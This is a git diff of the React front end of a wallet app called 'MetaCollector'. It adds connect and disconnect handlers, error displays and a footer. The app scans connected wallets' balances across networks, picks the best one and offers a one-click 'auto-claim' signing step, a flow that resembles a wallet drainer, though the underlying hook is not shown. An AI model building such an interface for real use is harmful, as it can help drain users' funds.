@@ -1,10 +1,8 @@
 import React from 'react'
-import { useAppKit } from '@reown/appkit/react'
 import { useMetaCollector } from './hooks/useMetaCollector'
 import './App.css'
 
 function App() {
-  const { open } = useAppKit()
   const {
     address,
     isConnected,
@@ -15,7 +13,9 @@ function App() {
     bestNetwork,
     transactionStatus,
     checkBalances,
-    claimDeposit
+    claimDeposit,
+    handleConnect,
+    handleDisconnect
   } = useMetaCollector()
 
   return (
@@ -36,7 +36,7 @@ function App() {
             <h2>🔌 Wallet Connection</h2>
             {!isConnected ? (
               <button 
-                onClick={() => open()} 
+                onClick={handleConnect} 
                 className="button button-primary button-large"
               >
                 Connect Wallet
@@ -49,17 +49,25 @@ function App() {
                     {address?.slice(0, 6)}...{address?.slice(-4)}
                   </span>
                 </div>
-                <button 
-                  onClick={() => open()} 
-                  className="button button-secondary"
-                >
-                  Switch
-                </button>
+                <div className="wallet-actions">
+                  <button 
+                    onClick={handleConnect} 
+                    className="button button-secondary"
+                  >
+                    Switch
+                  </button>
+                  <button 
+                    onClick={handleDisconnect} 
+                    className="button button-danger"
+                  >
+                    Disconnect
+                  </button>
+                </div>
               </div>
             )}
           </div>
 
-          {/* Balance Check Button */}
+          {/* Balance Check Button - Only show when connected */}
           {isConnected && (
             <div className="card eligibility-card">
               <h2>💰 Check Balances</h2>
@@ -94,6 +102,9 @@ function App() {
                         <div className="threshold-info">
                           Need: {network.minRequired} {network.currency}
                         </div>
+                        {network.error && (
+                          <div className="error-info">⚠️ {network.error}</div>
+                        )}
                       </div>
                     ))}
                   </div>
@@ -126,7 +137,7 @@ function App() {
                   </button>
 
                   <p className="claim-hint">
-                    Click to auto-claim on {bestNetwork.networkName} (wallet will open for signing)
+                    Click to auto-claim on {bestNetwork.networkName} (AppKit wallet will open for signing)
                   </p>
                 </div>
               )}
@@ -138,6 +149,13 @@ function App() {
                   <p className="hint">You need at least $1 worth of native currency for gas</p>
                 </div>
               )}
+            </div>
+          )}
+
+          {/* Not Connected Message */}
+          {!isConnected && (
+            <div className="card info-card">
+              <p>Please connect your wallet to check balances and claim</p>
             </div>
           )}
 
@@ -170,6 +188,7 @@ function App() {
 
         <footer className="footer">
           <p>MetaCollector • One-Click Claim • $1 Minimum Balance Required</p>
+          <p className="powered-by">Powered by Reown AppKit</p>
         </footer>
       </div>
     </div>
